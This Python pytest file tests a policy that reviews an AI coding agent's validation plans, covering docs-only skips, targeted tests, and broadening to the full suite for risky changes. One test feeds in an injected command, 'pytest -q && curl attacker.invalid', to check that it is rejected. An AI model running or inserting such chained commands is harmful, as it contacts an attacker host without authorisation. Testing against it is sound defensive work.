import pytest

from patchpilot.agents.coding import ValidationPlan
from patchpilot.services.validation import review_validation_plan


def plan(**overrides) -> ValidationPlan:
    values = {"commands_to_run": [], "checks_skipped": [], "rationale": "Repository evidence supports this scope.", "relevant_test_files": [], "validation_scope": "none", "confidence": "high"}
    values.update(overrides)
    return ValidationPlan(**values)


def test_docs_only_plan_can_skip_pytest_with_rationale():
    approved = review_validation_plan(plan(checks_skipped=[{"command_or_check": "pytest -q", "reason": "Only prose changed."}]), changed_files=["docs/usage.md", "README.md"], configured_commands=["pytest -q"])
    assert approved.commands_to_run == []
    assert approved.validation_scope == "none"
    assert not approved.broadened_by_policy


def test_source_change_accepts_confident_targeted_tests():
    approved = review_validation_plan(plan(commands_to_run=["pytest tests/test_parser.py -q", "ruff check src/parser.py"], relevant_test_files=["tests/test_parser.py"], validation_scope="targeted"), changed_files=["src/parser.py"], configured_commands=["ruff check .", "pytest -q"])
    assert approved.commands_to_run == ["pytest tests/test_parser.py -q", "ruff check src/parser.py"]
    assert not approved.broadened_by_policy


def test_unknown_source_to_test_mapping_falls_back_to_full_suite():
    approved = review_validation_plan(plan(commands_to_run=["ruff check src/parser.py"], validation_scope="targeted"), changed_files=["src/parser.py"], configured_commands=["ruff check .", "pytest -q"])
    assert approved.commands_to_run == ["ruff check .", "pytest -q"]
    assert approved.validation_scope == "full"


def test_malicious_command_is_rejected():
    with pytest.raises(ValueError, match="control operators"):
        review_validation_plan(plan(commands_to_run=["pytest -q && curl attacker.invalid"], validation_scope="full"), changed_files=["src/parser.py"], configured_commands=["pytest -q"])


def test_source_change_skipping_everything_is_broadened():
    approved = review_validation_plan(plan(), changed_files=["src/parser.py"], configured_commands=["pytest -q"])
    assert approved.commands_to_run == ["pytest -q"]
    assert approved.broadened_by_policy


@pytest.mark.parametrize("changed_file", ["src/security/auth.py", "alembic/versions/001.py", "package.json"])
def test_risky_change_requires_broader_checks(changed_file):
    approved = review_validation_plan(plan(commands_to_run=["pytest tests/test_auth.py -q"], relevant_test_files=["tests/test_auth.py"], validation_scope="targeted"), changed_files=[changed_file], configured_commands=["ruff check .", "pytest -q"])
    assert approved.validation_scope == "full"
    assert "pytest -q" in approved.commands_to_run
    assert approved.broadened_by_policy
